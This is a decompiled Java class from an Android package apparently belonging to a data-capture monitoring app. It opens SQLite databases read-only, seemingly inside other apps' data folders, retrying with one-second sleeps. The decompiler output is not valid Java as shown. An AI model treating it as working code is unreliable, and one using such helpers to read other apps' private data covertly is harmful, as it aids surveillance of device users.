package com.vvt.capture.c.a.a;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;

public class a
{
  private static final boolean a;
  private static final boolean b;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.ak.a.e;
      return;
    }
  }
  
  private static SQLiteDatabase a(int paramInt, String paramString1, String paramString2)
  {
    Object localObject1 = null;
    SQLiteDatabase localSQLiteDatabase;
    if (0 == 0)
    {
      localObject2 = com.vvt.n.a.a(paramString1);
      if (localObject2 == null) {
        return localObject1;
      }
      i = 2;
      localObject3 = new Object[i];
      localSQLiteDatabase = null;
      localObject3[0] = localObject2;
      localObject3[1] = paramString2;
      localObject1 = String.format("%s/%s", (Object[])localObject3);
      boolean bool1 = a;
      if (!bool1) {}
    }
    Object localObject3 = a((String)localObject1, paramInt);
    int j = 5;
    Object localObject2 = localObject3;
    int i = j;
    while ((localObject2 == null) && (i > 0))
    {
      boolean bool2 = a;
      if (bool2) {}
      long l = 1000L;
      SystemClock.sleep(l);
      localSQLiteDatabase = a((String)localObject1, paramInt);
      int k = i + -1;
      i = k;
      localObject2 = localSQLiteDatabase;
    }
    localObject1 = localObject2;
    return (SQLiteDatabase)localObject1;
  }
  
  public static SQLiteDatabase a(String paramString)
  {
    int i = 1;
    Object localObject;
    if (paramString == null)
    {
      boolean bool1 = a;
      if (bool1) {}
      bool1 = false;
      localObject = null;
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject;
      SQLiteDatabase localSQLiteDatabase1 = a(paramString, i);
      int j = 5;
      localObject = localSQLiteDatabase1;
      int m = j;
      while ((localObject == null) && (m > 0))
      {
        boolean bool2 = a;
        if (bool2) {}
        long l = 1000L;
        SystemClock.sleep(l);
        SQLiteDatabase localSQLiteDatabase2 = a(paramString, i);
        int k = m + -1;
        m = k;
        localObject = localSQLiteDatabase2;
      }
    }
  }
  
  private static SQLiteDatabase a(String paramString, int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    bool = false;
    try
    {
      localSQLiteDatabase = SQLiteDatabase.openDatabase(paramString, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
  
  public static SQLiteDatabase a(String paramString1, String paramString2)
  {
    if ((paramString1 == null) || (paramString2 == null))
    {
      boolean bool = a;
      if (bool) {}
      bool = false;
    }
    int i;
    for (SQLiteDatabase localSQLiteDatabase = null;; localSQLiteDatabase = a(i, paramString1, paramString2))
    {
      return localSQLiteDatabase;
      i = 17;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/a/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */